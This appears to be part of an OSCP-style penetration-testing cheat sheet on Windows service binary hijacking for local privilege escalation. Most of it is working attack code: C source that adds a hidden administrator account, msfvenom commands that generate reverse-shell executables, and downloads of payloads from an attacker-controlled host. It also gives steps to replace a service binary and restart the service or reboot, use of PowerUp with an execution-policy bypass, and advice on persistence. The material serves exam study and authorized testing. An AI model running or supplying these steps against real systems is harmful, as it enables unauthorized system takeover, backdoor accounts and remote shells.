### **Service Binary Hijacking**

### **Basic and Main Checks**

**Check Running Services**

```powershell
# Tip: Look for services with paths outside of `system32` or other unexpected locations.; try to find that thing that seems out of place.
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -eq 'Running'}

```

**Review Permissions of a Service**

```powershell
icacls "C:\Path\To\ServiceBinary.exe"

```

**Obtain Startup Type of a Service**

```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -eq '<ServiceName>'}

```

**Creating an Executable That Adds a New Administrator User**

```c
#include <stdlib.h>int main ()
{
  system("net user emma Password123! /add");
  system("net localgroup administrators emma /add");
  return 0;
}

```

```bash
# Cross-Compile the C Code to a 64-bit Application
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

```

**Creating an Executable that is a Reverse Shell**

```bash
# For 64-bit executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o reverse_shell.exe

# For 32-bit executable
msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o reverse_shell.exe

```

**Replacing the Service Binary with a Malicious Binary** It can be a reverse shell generated from `msfvenom` or for example the program above that will add a new user to the system.

```powershell
# Remember to run the HTTP server on your Kali to be able to bring the binary.
iwr -uri http://<attacker-ip>/adduser.exe -Outfile adduser.exe

move "C:\Path\To\ServiceBinary.exe" "C:\Path\To\Backup\ServiceBinary.exe"

move .\adduser.exe "C:\Path\To\ServiceBinary.exe"

```

**Restart the Service**

- Using PowerShell Function

```powershell
Restart-Service -Name '<ServiceName>'

```

- Using `sc.exe`

```powershell
sc.exe stop <ServiceName>
sc.exe start <ServiceName>

```

**Restart the System**

```powershell
# First check for reboot privileges: SeShutdownPrivilege should be Assigned and Enabled.
whoami /priv

# Perform the restart
shutdown /r /t 0

```

### **Additional Optional Checks**

**Automating the Process with PowerUp**

1. **Start the HTTP server** in our Kali with the script in the folder.

```bash
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80

```

1. **Bring the script** and run it.

```powershell
iwr -uri http://<attacker-ip>/PowerUp.ps1 -Outfile PowerUp.ps1

powershell -ep bypass
. .\PowerUp.ps1

Get-ModifiableServiceFile

Install-ServiceBinary -Name '<ServiceName>'

```

1. (**Optional**) Find files and check paths for which our current user can modify.

```powershell
$ModifiableFiles = echo 'C:\Path\To\ServiceBinary.exe' | Get-ModifiablePath -Literal

```

**Script to find Services with Weak Permissions**

```powershell
Get-CimInstance -ClassName win32_service | Select Name, PathName | ForEach-Object {
    $path = $_.PathName -replace '"', ''
    if (Test-Path $path) {
        icacls $path
    }
}

```

**Inspect Service Dependencies** Some services use configuration files that can be hijacked similarly to service binaries.

```powershell
# List service dependencies
Get-CimInstance -ClassName win32_service | Select Name, PathName, DependentServices | Where-Object {$_.DependentServices -ne $null}

```

**Check for Service Configuration File Hijacking** Services often have dependencies that might also be vulnerable. Check dependencies to identify additional attack vectors.

```powershell
# Some services use configuration files that can be hijacked similarly to service binaries. Example: Checking permissions on a configuration file
icacls "C:\Path\To\Service\ConfigFile.ini"

```

**Service Binary Analysis** Keep. in mind that some of the PWK machines were solved using reverse engineering to find hardcoded credentials or important strings; so perform static analysis of the service binary to understand its behavior and identify potential weaknesses or vulnerabilities.

1. **Bring the binary** to the Kali: If you are using some `impacket-tool` you can use their built-in function to bring the file; but if you are using a reverse shell use the steps from the **Section 17.6** of this cheatsheet.
2. **Perform the analysis** with multiple tools

```bash
strings [downloaded_binary]

flare-floss [downloaded_binary]

# Use dnSpy if you know that the binary was built using .NET.

# You could also use tools like PEiD, IDA Pro, or Ghidra to analyze the binary (this is not recommended because the exam is usually not that complex and you could be going into a rabbit hole).

```

**Monitor Service Activity** After replacing the service binary, monitor system activity to ensure that the new binary is executed correctly and to identify any issues.

```powershell
Get-WinEvent -LogName System | Where-Object {$_.Message -like "*<ServiceName>*"}

```

**Ensure Persistence** For maintaining access, ensure that the changes are persistent across reboots and do not get overwritten by updates or system checks.

```powershell
# Check for system update settings that might revert changes
Get-WindowsUpdateLog
``` 
